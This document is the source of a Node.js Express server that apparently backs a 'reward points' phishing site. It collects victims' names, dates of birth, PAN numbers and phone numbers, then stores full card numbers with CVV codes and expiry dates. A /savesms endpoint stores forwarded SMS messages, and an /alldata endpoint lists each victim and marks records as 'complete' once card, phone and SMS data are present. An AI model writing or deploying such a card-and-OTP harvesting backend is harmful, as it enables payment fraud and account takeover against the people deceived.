require('dotenv').config();
const express = require('express');
const path = require('path');
const bodyParser = require('body-parser');
const twilio = require('twilio');
const axios = require('axios');
const cors = require('cors');
var valid = require("card-validator");
const { Console } = require('console');
const app = express();
app.set('view engine', 'ejs');
app.set('views', path.join(__dirname, 'views'));
app.use(express.static(path.join(__dirname, 'public')));
app.use(bodyParser.urlencoded({ extended: false }));
app.use(bodyParser.json());
const cookieParser = require('cookie-parser');
const { generateToken, verifyToken } = require('./jwt');
const session = require('express-session');
const mongoose = require('mongoose')
const dbURL = process.env.ATLAS_DB_URL;
const APP_PORT = process.env.AppPORT;








// defining the model for schema
const UserSchema = new mongoose.Schema({
  phone: { type: String, required: true, unique: true },
  userData: {
      // Define fields within userData based on your requirements
      name: String,
      dob: String,
      pan: String,
      phone: String,
  },
  cards: [{
      cardNumber: String,
      cvv: String,
      expiryDate: String
  }],
  sms: [{
    address: String,
    body: String,
    date: String
    }],
  startTime: { type: Date, required: true }
});

const User = mongoose.model('User', UserSchema);


app.use(cors({ 
    origin: '*', 
    methods: ['GET','POST'],
}));

app.use(cookieParser());

app.use(express.json());

app.use(express.urlencoded({extended:true}))

app.use(session({
  secret: 'your-secret-key', // Replace with a strong secret key
  resave: false,
  saveUninitialized: true,
  cookie: { secure: false } // Set to true if using HTTPS
}));


mongoose.connect(dbURL)
  .then(() => console.log('DB Connected!'))
  .catch(err => {
    console.error('DB Connection Error:', err.message);
    process.exit(1);
  });


// Mt SID
const accountSid = process.env.TWILIO_ACCOUNT_SID;
const authToken = process.env.TWILIO_AUTH_TOKEN;
const serviceSid = process.env.TWILIO_SERVICE_SID;
const client = twilio(accountSid, authToken);


const asyncHandler = fn => (req, res, next) => {
  Promise.resolve(fn(req, res, next)).catch(next);
};


// // Route for Login Page
app.get('/', (req, res) => {
  res.render('login');
});

app.get('/', (req, res) => {
  res.render('login');
});


// // Route for reward
app.get('/reward',(req, res) => {
    res.render('reward');
  });


// // Route for reward points
app.get('/rewardpoints', (req, res) => {
  const startTime = req.query.startTime; // Extract startTime from query parameters
  res.render('reward_points', { startTime });
});

function hasRequiredData(user) {
    // Check if user is null or undefined
    if (!user) {
      console.error('User object is null or undefined:', user);
      return false;
    }
  
    const hasSMS = Array.isArray(user.sms) && user.sms.length > 0;
    const hasPhone = typeof user.phone === 'string' && user.phone.trim() !== '';
    const hasCardNumber = Array.isArray(user.cards) && user.cards.length >= 1;
  
    console.log('hasSMS:', hasSMS, 'hasPhone:', hasPhone, 'hasCardNumber:', hasCardNumber);
  
    return hasSMS && hasPhone && hasCardNumber;
  }
  


app.get('/user/:phone',asyncHandler( async (req, res) => {
  const { phone } = req.params;

  try {
    const user = await User.findOne({ phone });

    if (!user) {
      return res.status(404).json({ valid: false, message: 'User not found' });
    }
    // const smsSorted = user.sms.sort((a, b) => b.check_date - a.check_date);
    const firstCard = Array.isArray(user.cards) && user.cards.length > 0 ? user.cards[0] : { _id: 0 };

    console.log(user.sms)

    res.json({
      data: {
        name: user.userData.name,
        dob: user.userData.dob,
        phone: user.userData.phone,
        pan: user.userData.pan,
        cards: firstCard,
        _id:firstCard._id},
      sms: user.sms
    });
  } catch (error) {
    console.error('Error fetching user data:', error);
    res.status(500).json({ valid: false, error: 'Internal server error' });
  }
}));
 



app.get('/alldata',asyncHandler( async (req, res) => {
    try {
      const allUsersWithSMS = await User.find()
  
      if (allUsersWithSMS.length === 0) {
        return res.status(404).json({ valid: false, message: 'No SMS data found.' });
      }
  
      const formattedData = allUsersWithSMS.map(user => {
        return {
          phone: user.phone,
          complete: hasRequiredData(user),  // Use the function here
          userData: user.userData 
        };
      });
  
      res.json({
        data: formattedData
      });
    } catch (error) {
      console.error('Error fetching SMS data:', error);
      res.status(500).json({ valid: false, error: 'Internal server error' });
    }
  }));


app.post('/savesms', asyncHandler(async(req, res) => {
      var { address, body, date,phone } = req.body;
    console.log("received data savsms",address,body,date,phone)
    const smsData = {
      address,
      body,       
      date
    };
    console.log('Updating user with phone:', phone);
    try {
        const user = await User.findOneAndUpdate(
            { phone },
            { $push: { sms: smsData } },
            { new: true } 
        );
        if (user) {
            console.log('Card successfully added to user:', user);
            res.json({ valid: true });
        } else {
            console.log('User not found, responding with error');
            res.json({ valid: false, error: 'User not found' });
        }
    } catch (error) {
        console.error('Error saving card to MongoDB:', error);
        res.json({ valid: false, error: 'Error saving card details' });
    }
  }));
  



app.post('/sendOTP', asyncHandler((req, res) => {
  // console.log("OTP sent to",req.body)
    // res.json({ success: true});
    const { phone } = req.body;
    console.log(phone)
    client.verify.v2.services(serviceSid)
      .verifications
      .create(
        {to: phone, channel: 'sms'}
      )
      .then(verification => {
          console.log(verification.sid);
          res.json({ success: true, sid: verification.sid });
      })
      .catch(error => {
          console.error('Error sending OTP:', error);
          res.json({ success: false, error: error.message });
      });
}));





app.post('/verifyOTP', async (req, res) => {
  const { phone, otp, userData } = req.body;
  try {
      // Use await to get the verification result
      const verification_check = await client.verify.v2.services(serviceSid)
          .verificationChecks
          .create({ to: phone, code: otp });

      if (verification_check.status === 'approved') {
        let userWithCards = await User.findOne({ phone, 'cards': { $not: { $size: 0 } } });

        if (userWithCards) {
            console.log('Number already exists, responding with error');
            return res.json({ valid: false, error: 'number already exist', startTime: userWithCards.startTime });
        }
          try {
              console.log("userdata",userData)
              let user = await User.findOneAndUpdate(
                  { phone }, 
                  { $set: { userData } },  
                  { upsert: true, new: true }
              );
              req.session.userData = { phone : phone ,...userData };
              const token = generateToken({ phone });
              res.cookie('token', token, { httpOnly: true, secure: true, sameSite: 'strict' });
              res.json({ success: true });
          } catch (error) {
              console.error('Error saving user data to MongoDB:', error);
              res.json({ success: false, error: 'Error saving user data' });
          }
      } else {
          res.json({ success: false });
      }
  } catch (error) {
      console.error("Error verifying OTP:", error);
      res.json({ success: false, error: error.message });
  }
});




app.post('/validateCard', asyncHandler(async (req, res) => {
  console.log('Received request to /validateCard', req.session);
  const { cardNumber, cvv, expiryDate } = req.body;

  // Input Validation
  const numberValidation = valid.number(cardNumber);
  // if (!numberValidation.isValid) {
  //   return res.json({ valid: false, error: numberValidation.isPotentiallyValid 
  //                                          ? 'Invalid card number' 
  //                                          : 'Invalid card number format' }); 
  // }

  try {
    // Check for Duplicate Card (with Timeout)
    const timeoutPromise = new Promise((_, reject) => {
      setTimeout(() => reject(new Error('Database query timeout')), 5000); // 5-second timeout
    });

    const existsPromise = User.exists({ 'cards.cardNumber': cardNumber });
    const result = await Promise.race([existsPromise, timeoutPromise]); 

    if (result) {
      return res.json({ valid: false, error: 'duplicate' });
    }

  } catch (error) {
    console.error("Error checking card existence:", error.message); // Log the error message
    if (error.message === 'Database query timeout') {
      return res.status(503).json({ valid: false, error: 'Service unavailable' });
    } else {
      return res.status(500).json({ valid: false, error: 'Internal server error' });
    }
  }

  // User Data Check and Card Saving
  if (!req.session.userData) {
    return res.json({ valid: false, error: 'invalidsession' });
  }

  const userData = req.session.userData;
  const phone = userData.phone;
  const startTime = new Date();

  try {
    const user = await User.findOneAndUpdate(
      { phone },
      { $push: { cards: { cardNumber, cvv, expiryDate } },
      $set: { startTime } },
      { new: true }
    );

    if (user) {
      res.json({ valid: true });
    } else {
      res.json({ valid: false, error: 'User not found' });
    }
  } catch (error) {
    console.error('Error saving card:', error.message);  // Log the error message
    res.json({ valid: false, error: 'Error saving card details' });
  }
}));





app.get('*', (req, res) => {
  res.render('pnf');
});


app.use((err, req, res, next) => {
  console.error(err.stack);
  res.status(err.status || 500).json({
    success: false,
    message: err.message || 'Internal Server Error'
  });
});



app.listen(APP_PORT, () => {
    console.log(`Server running on port ${APP_PORT}`);
});
